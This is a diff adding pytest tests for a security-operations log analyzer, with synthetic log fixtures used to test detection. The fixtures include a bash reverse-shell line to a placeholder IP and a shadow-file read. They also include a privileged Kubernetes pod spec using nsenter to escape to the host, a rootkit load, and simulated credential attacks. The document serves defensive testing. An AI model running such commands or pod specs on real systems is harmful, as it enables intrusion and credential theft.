@@ -426,3 +426,209 @@ async def test_identity_and_ueba_parser():
     assert "BENIGN CELLULAR ROAMING" in findings_id_text
     assert "BENIGN USER TYPO" in findings_id_text
 
+
+@pytest.mark.asyncio
+async def test_case4_k8s_container_escape_full_pipeline(tmp_path):
+    from src.registry.tools.soc_tools import (
+        gather_log_evidence,
+        analyze_incident_impact,
+        compress_security_timeline,
+    )
+
+    # 1. linux_auth.log
+    auth_file = tmp_path / "linux_auth.log"
+    auth_file.write_text(
+        "Sep 14 08:34:22 k8s-worker-node-01 sudo: www-data : user NOT in sudoers ; TTY=pts/2 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow\n"
+        "Sep 14 08:38:10 k8s-worker-node-01 crontab[16201]: (www-data) REPLACE (www-data)\n"
+        "Sep 14 08:39:01 k8s-worker-node-01 CRON[16240]: pam_unix(cron:session): session opened for user www-data(uid=33) by (uid=0)\n"
+        "Sep 14 08:41:50 k8s-worker-node-01 sudo: deploy : TTY=pts/3 ; USER=root ; COMMAND=/bin/bash\n"
+        "Sep 14 08:14:02 k8s-worker-node-01 sudo: sysadmin : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/systemctl status nginx\n"
+        "Sep 14 08:15:00 k8s-worker-node-01 CRON[12401]: (root) CMD (run-parts --report /etc/cron.daily)\n",
+        encoding="utf-8"
+    )
+
+    # 2. linux_audit.log
+    audit_file = tmp_path / "linux_audit.log"
+    audit_file.write_text(
+        'type=SYSCALL msg=audit(1789461735.123:455): arch=c000003e syscall=257 success=yes exit=3 a0=5 a1=... auid=1001 uid=0 comm="cat" exe="/usr/bin/cat" key="shadow_access"\n'
+        'type=PATH msg=audit(1789461735.123:455): item=0 name="/etc/shadow" nametype=NORMAL\n'
+        'type=SYSCALL msg=audit(1789461930.123:456): arch=c000003e syscall=313 success=yes exit=0 auid=1001 uid=0 comm="insmod" exe="/usr/bin/kmod" key="kernel_module_load"\n'
+        'type=EXECVE msg=audit(1789461541.123:457): argc=3 a0="/bin/bash" a1="-c" a2="bash -i >& /dev/tcp/198.51.100.77/4444 0>&1"\n',
+        encoding="utf-8"
+    )
+
+    # 3. linux_dmesg_syslog.log
+    dmesg_file = tmp_path / "linux_dmesg_syslog.log"
+    dmesg_file.write_text(
+        "Sep 14 08:45:30 k8s-worker-node-01 kernel: [   45.123456] diamorphine: loading out-of-tree module taints kernel.\n"
+        "Sep 14 08:45:30 k8s-worker-node-01 kernel: [   45.123510] [diamorphine] loaded successfully: hooked sys_call_table at 0xffffffff82000280\n"
+        "Sep 14 08:50:04 k8s-worker-node-01 kernel: [   85.123456] process 24891 (nsenter) entering host pid namespace\n"
+        "Sep 14 08:50:04 k8s-worker-node-01 kernel: [   85.123490] mounted host root path / to /host\n"
+        "Sep 14 08:55:00 k8s-worker-node-01 kernel: [  120.123456] TCP: Possible SYN flooding on port 443.\n",
+        encoding="utf-8"
+    )
+
+    # 4. k8s_api_audit.json
+    k8s_file = tmp_path / "k8s_api_audit.json"
+    k8s_file.write_text(
+        '{"kind":"Event","apiVersion":"audit.k8s.io/v1","verb":"get","stageTimestamp":"2026-09-14T08:48:12.000000Z","user":{"username":"system:serviceaccount:frontend-apps:webapp-sa"},"sourceIPs":["10.244.1.45"],"objectRef":{"resource":"pods","namespace":"kube-system"},"userAgent":"kubectl/v1.28.0"}\n'
+        '{"kind":"Event","apiVersion":"audit.k8s.io/v1","verb":"create","stageTimestamp":"2026-09-14T08:50:04.000000Z","user":{"username":"system:serviceaccount:frontend-apps:webapp-sa"},"sourceIPs":["10.244.1.45"],"objectRef":{"resource":"pods","namespace":"kube-system","name":"system-health-diagnostics-pod"},"requestObject":{"spec":{"hostPID":true,"hostNetwork":true,"hostIPC":true,"containers":[{"name":"breakout","image":"alpine:3.18","command":["nsenter","--target","1","--mount","--uts","--ipc","--net","--pid","--","/bin/sh"]}],"volumes":[{"name":"host-root","hostPath":{"path":"/"}}]}}}\n'
+        '{"kind":"Event","apiVersion":"audit.k8s.io/v1","verb":"create","stageTimestamp":"2026-09-14T08:52:18.000000Z","user":{"username":"system:serviceaccount:frontend-apps:webapp-sa"},"sourceIPs":["10.244.1.45"],"objectRef":{"resource":"clusterrolebindings","name":"system-cluster-admin-binding"},"requestObject":{"roleRef":{"name":"cluster-admin"},"subjects":[{"kind":"ServiceAccount","name":"webapp-sa"}]}}\n'
+        '{"kind":"Event","apiVersion":"audit.k8s.io/v1","verb":"get","stageTimestamp":"2026-09-14T08:53:40.000000Z","user":{"username":"system:serviceaccount:frontend-apps:webapp-sa"},"sourceIPs":["10.244.1.45"],"objectRef":{"resource":"secrets","namespace":"kube-system"}}\n'
+        '{"kind":"Event","apiVersion":"audit.k8s.io/v1","verb":"update","stageTimestamp":"2026-09-14T08:40:00.000000Z","user":{"username":"system:kube-controller-manager"},"sourceIPs":["10.0.0.10"],"objectRef":{"resource":"endpoints","namespace":"kube-system","name":"kube-controller-manager"}}\n',
+        encoding="utf-8"
+    )
+
+    # Execute gather_log_evidence
+    evidence = await gather_log_evidence(str(tmp_path), pattern="*.*")
+    assert "k8s_api_audit.json" in evidence
+    assert "linux_auth.log" in evidence
+    assert "linux_audit.log" in evidence
+    assert "linux_dmesg_syslog.log" in evidence
+
+    # Verify threat extraction
+    assert "198.51.100.77" in evidence
+    assert "system-health-diagnostics-pod" in evidence
+    assert "system-cluster-admin-binding" in evidence
+    assert "diamorphine" in evidence
+
+    # Verify benign discrimination
+    assert "BENIGN BASELINE K8S CONTROLLER" in evidence
+    assert "BENIGN BASELINE ADMIN MAINTENANCE" in evidence
+    assert "BENIGN BASELINE SYSTEM CRON" in evidence
+    assert "BENIGN KERNEL WARNING" in evidence
+
+    # Execute analyze_incident_impact
+    impact = await analyze_incident_impact(evidence)
+    assert "Container Breakout" in impact
+    assert "Kernel Compromise" in impact
+    assert "Control Plane Escalation" in impact
+    assert "Host Credential Access" in impact
+    # Crucial assertion: SYN flood DoS trajectory MUST NOT be added
+    assert "Availability Impact" not in impact
+    assert "SYN flood" not in impact or "BENIGN" in impact
+
+    # Crucial assertion: sysadmin must NOT be listed under compromised identities
+    impact_lines = impact.splitlines()
+    ident_section = False
+    compromised_idents = []
+    for line in impact_lines:
+        if "COMPROMISED IDENTITIES" in line:
+            ident_section = True
+            continue
+        if ident_section and line.startswith("\n") or "3. OBSERVED ATTACK" in line:
+            ident_section = False
+            continue
+        if ident_section and line.strip().startswith("•"):
+            compromised_idents.append(line.strip())
+
+    comp_text = " ".join(compromised_idents)
+    assert "sysadmin" not in comp_text
+    assert "system:kube-controller-manager" not in comp_text
+
+    # Execute compress_security_timeline
+    timeline = await compress_security_timeline(evidence)
+    assert "=== [COMPRESSED INCIDENT TIMELINE]" in timeline
+    assert "Phase 01" in timeline
+
+
+@pytest.mark.asyncio
+async def test_case3_identity_takeover_impossible_travel_full_pipeline(tmp_path):
+    from src.registry.tools.soc_tools import (
+        gather_log_evidence,
+        analyze_incident_impact,
+        compress_security_timeline,
+    )
+
+    # 1. cisco_asa_vpn.log
+    vpn_file = tmp_path / "cisco_asa_vpn.log"
+    vpn_file.write_text(
+        # Trap 1: charlie.brown typo (11:58:20 fail, 11:58:28 success on 198.51.100.77)
+        "Sep 14 11:58:20 cisco-asa %ASA-6-113015: AAA user authentication Rejected : reason = 'User authentication failed' : user = charlie.brown : user IP = 198.51.100.77\n"
+        "Sep 14 11:58:28 cisco-asa %ASA-6-113039: Group <Corporate-Employees> User <charlie.brown> IP <198.51.100.77> AnyConnect parent session started.\n"
+        "Sep 14 11:58:29 cisco-asa %ASA-4-722051: Group <Corporate-Employees> User <charlie.brown> IP <198.51.100.77> IPv4 Address <10.200.1.10> assigned to session\n"
+        # Trap 2: alice.wang cellular roaming (12:00:10 on .8, 12:08:15 on .44 in Dallas)
+        "Sep 14 12:00:10 cisco-asa %ASA-6-113039: Group <Corporate-Employees> User <alice.wang> IP <172.56.21.8> AnyConnect parent session started.\n"
+        "Sep 14 12:00:11 cisco-asa %ASA-4-722051: Group <Corporate-Employees> User <alice.wang> IP <172.56.21.8> IPv4 Address <10.200.1.11> assigned to session\n"
+        "Sep 14 12:08:15 cisco-asa %ASA-6-113039: Group <Corporate-Employees> User <alice.wang> IP <172.56.21.44> AnyConnect parent session started.\n"
+        "Sep 14 12:08:16 cisco-asa %ASA-4-722051: Group <Corporate-Employees> User <alice.wang> IP <172.56.21.44> IPv4 Address <10.200.1.12> assigned to session\n"
+        # Stage 5: Password spraying from 185.220.101.5 across 5 accounts
+        "Sep 14 12:10:01 cisco-asa %ASA-6-113015: AAA user authentication Rejected : reason = 'User authentication failed' : user = administrator : user IP = 185.220.101.5\n"
+        "Sep 14 12:10:05 cisco-asa %ASA-6-113015: AAA user authentication Rejected : reason = 'User authentication failed' : user = admin : user IP = 185.220.101.5\n"
+        "Sep 14 12:10:09 cisco-asa %ASA-6-113015: AAA user authentication Rejected : reason = 'User authentication failed' : user = vpnuser : user IP = 185.220.101.5\n"
+        "Sep 14 12:10:12 cisco-asa %ASA-6-113015: AAA user authentication Rejected : reason = 'User authentication failed' : user = backup : user IP = 185.220.101.5\n"
+        "Sep 14 12:10:16 cisco-asa %ASA-6-113015: AAA user authentication Rejected : reason = 'User authentication failed' : user = service_adm : user IP = 185.220.101.5\n"
+        # Stage 6: david.clark compromise from 185.220.101.5
+        "Sep 14 12:10:20 cisco-asa %ASA-6-113039: Group <Corporate-Employees> User <david.clark> IP <185.220.101.5> AnyConnect parent session started.\n"
+        "Sep 14 12:10:21 cisco-asa %ASA-4-722051: Group <Corporate-Employees> User <david.clark> IP <185.220.101.5> IPv4 Address <10.200.1.88> assigned to session\n"
+        # Stage 7: john.doe baseline from New York (203.0.113.50) at 12:15:00
+        "Sep 14 12:15:00 cisco-asa %ASA-6-113039: Group <Corporate-Employees> User <john.doe> IP <203.0.113.50> AnyConnect parent session started.\n"
+        "Sep 14 12:15:01 cisco-asa %ASA-4-722051: Group <Corporate-Employees> User <john.doe> IP <203.0.113.50> IPv4 Address <10.200.1.30> assigned to session\n"
+        # Stage 7: john.doe VPN impossible travel from Frankfurt (194.165.16.104) at 12:33:18
+        "Sep 14 12:33:18 cisco-asa %ASA-6-113039: Group <Corporate-Employees> User <john.doe> IP <194.165.16.104> AnyConnect parent session started.\n"
+        "Sep 14 12:33:19 cisco-asa %ASA-4-722051: Group <Corporate-Employees> User <john.doe> IP <194.165.16.104> IPv4 Address <10.200.1.31> assigned to session\n",
+        encoding="utf-8"
+    )
+
+    # 2. azure_ad_signins.json
+    aad_file = tmp_path / "azure_ad_signins.json"
+    aad_file.write_text(
+        # Stage 1: cfo baseline New York (09:00:00)
+        '{"userPrincipalName":"cfo.executive@enterprise.com","createdDateTime":"2026-09-14T09:00:00Z","ipAddress":"198.51.100.25","appDisplayName":"Office 365 Exchange Online","deviceDetail":{"isCompliant":true,"browser":"Edge"},"location":{"city":"New York","countryOrRegion":"US","geoCoordinates":{"latitude":40.7128,"longitude":-74.0060}},"status":{"errorCode":0}}\n'
+        # Stage 1: cfo impossible travel Lagos (09:18:30)
+        '{"userPrincipalName":"cfo.executive@enterprise.com","createdDateTime":"2026-09-14T09:18:30Z","ipAddress":"102.164.12.89","appDisplayName":"Office 365 Exchange Online","riskDetail":"impossibleTravel","deviceDetail":{"isCompliant":false,"browser":"HeadlessChrome"},"location":{"city":"Lagos","countryOrRegion":"NG","geoCoordinates":{"latitude":6.5244,"longitude":3.3792}},"status":{"errorCode":0}}\n'
+        # Trap 3: marketing.lead typo (09:20:00 fail, 09:20:12 success)
+        '{"userPrincipalName":"marketing.lead@enterprise.com","createdDateTime":"2026-09-14T09:20:00Z","ipAddress":"198.51.100.15","appDisplayName":"Azure Portal","location":{"city":"Dallas","countryOrRegion":"US"},"status":{"errorCode":50126}}\n'
+        '{"userPrincipalName":"marketing.lead@enterprise.com","createdDateTime":"2026-09-14T09:20:12Z","ipAddress":"198.51.100.15","appDisplayName":"Azure Portal","deviceDetail":{"isCompliant":true},"location":{"city":"Dallas","countryOrRegion":"US"},"status":{"errorCode":0}}\n'
+        # Stage 2 & 3: sysadmin MFA fatigue from 194.26.29.110 (4 denies, 1 success at 09:24:10)
+        '{"userPrincipalName":"sysadmin@enterprise.com","createdDateTime":"2026-09-14T09:22:15Z","ipAddress":"194.26.29.110","appDisplayName":"Azure Portal","location":{"city":"Amsterdam","countryOrRegion":"NL"},"status":{"errorCode":500121,"failureReason":"MFA denied; user declined"}}\n'
+        '{"userPrincipalName":"sysadmin@enterprise.com","createdDateTime":"2026-09-14T09:22:45Z","ipAddress":"194.26.29.110","appDisplayName":"Azure Portal","location":{"city":"Amsterdam","countryOrRegion":"NL"},"status":{"errorCode":500121,"failureReason":"MFA denied; user declined"}}\n'
+        '{"userPrincipalName":"sysadmin@enterprise.com","createdDateTime":"2026-09-14T09:23:15Z","ipAddress":"194.26.29.110","appDisplayName":"Azure Portal","location":{"city":"Amsterdam","countryOrRegion":"NL"},"status":{"errorCode":500121,"failureReason":"MFA denied; user declined"}}\n'
+        '{"userPrincipalName":"sysadmin@enterprise.com","createdDateTime":"2026-09-14T09:23:45Z","ipAddress":"194.26.29.110","appDisplayName":"Azure Portal","location":{"city":"Amsterdam","countryOrRegion":"NL"},"status":{"errorCode":500121,"failureReason":"MFA denied; user declined"}}\n'
+        '{"userPrincipalName":"sysadmin@enterprise.com","createdDateTime":"2026-09-14T09:24:10Z","ipAddress":"194.26.29.110","appDisplayName":"Azure Portal","location":{"city":"Amsterdam","countryOrRegion":"NL"},"status":{"errorCode":0}}\n'
+        # Stage 4: senior.engineer pass-the-prt from 185.196.220.14
+        '{"userPrincipalName":"senior.engineer@enterprise.com","createdDateTime":"2026-09-14T09:40:02Z","ipAddress":"185.196.220.14","appDisplayName":"Azure PowerShell","riskDetail":"anomalousToken","deviceDetail":{"isCompliant":false},"location":{"city":"St. Petersburg","countryOrRegion":"RU"},"status":{"errorCode":0}}\n',
+        encoding="utf-8"
+    )
+
+    # Execute gather_log_evidence
+    evidence = await gather_log_evidence(str(tmp_path), pattern="*.*")
+    assert "cisco_asa_vpn.log" in evidence
+    assert "azure_ad_signins.json" in evidence
+
+    # Verify All 5 Attacker Threat IPs
+    assert "185.220.101.5" in evidence   # Tor exit node
+    assert "194.165.16.104" in evidence  # Frankfurt VPS proxy
+    assert "102.164.12.89" in evidence   # Lagos anonymizer
+    assert "194.26.29.110" in evidence   # Amsterdam bulletproof VPN
+    assert "185.196.220.14" in evidence  # St. Petersburg PRT replay
+
+    # Verify All 5 Compromised Accounts
+    assert "david.clark" in evidence
+    assert "john.doe" in evidence
+    assert "cfo.executive@enterprise.com" in evidence
+    assert "sysadmin@enterprise.com" in evidence
+    assert "senior.engineer@enterprise.com" in evidence
+
+    # Verify Benign Discrimination (Traps)
+    assert "BENIGN USER TYPO" in evidence
+    assert "BENIGN CELLULAR ROAMING" in evidence
+    assert "charlie.brown" in evidence  # Found in typo finding
+    assert "198.51.100.77" in evidence  # Found in typo baseline
+
+    # Verify analyze_incident_impact
+    impact = await analyze_incident_impact(evidence)
+    assert "Identity Anomaly" in impact
+    assert "Token Hijacking" in impact
+    assert "Authentication Fatigue" in impact
+    assert "Perimeter password spraying" in impact
+    assert "Valid VPN account compromise" in impact
+    assert "CRITICAL" in impact
+
+    # Verify timeline compression
+    timeline = await compress_security_timeline(evidence)
+    assert "=== [COMPRESSED INCIDENT TIMELINE]" in timeline
+    assert "Phase 01" in timeline
+
+
+
